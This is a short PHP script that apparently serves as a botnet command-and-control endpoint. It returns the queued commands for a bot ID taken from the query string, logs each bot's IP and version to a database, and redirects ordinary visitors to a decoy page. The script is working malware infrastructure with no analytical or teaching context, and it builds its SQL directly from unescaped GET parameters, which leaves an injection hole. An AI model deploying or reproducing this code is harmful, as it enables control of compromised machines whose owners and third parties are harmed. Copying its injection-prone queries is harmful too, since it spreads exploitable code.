<?php

require("cfg.php");

if (isset($_GET['ver']))
{
  $ver = $_GET['ver'];
  $id = $_GET['id'];
  $BotConfig = @mysql_query("SELECT * FROM BotConfig WHERE Ver='$ver' AND (BotId='$id' OR BotId='');");
  if (mysql_num_rows($BotConfig) < 1)
  {
    echo "\r\n";
  } else {
    for ($i=0; $i < mysql_num_rows($BotConfig); $i++) {
      $command = mysql_result($BotConfig,$i,'Command');
      echo "$command\r\n";
    }
  }

  $ip = $_SERVER['REMOTE_ADDR'];
  if ($log_activity)
	@mysql_query("INSERT INTO BotActivity (DateTime,BotId,BotVer,ActivityType,AdditionalId,IP) VALUES ('".date("Y-m-d H:i:s")."','$id','$ver','4','','$ip');");
} else {
  Header("Location: http://$server/index.html");
}
  mysql_close($dbase);
?>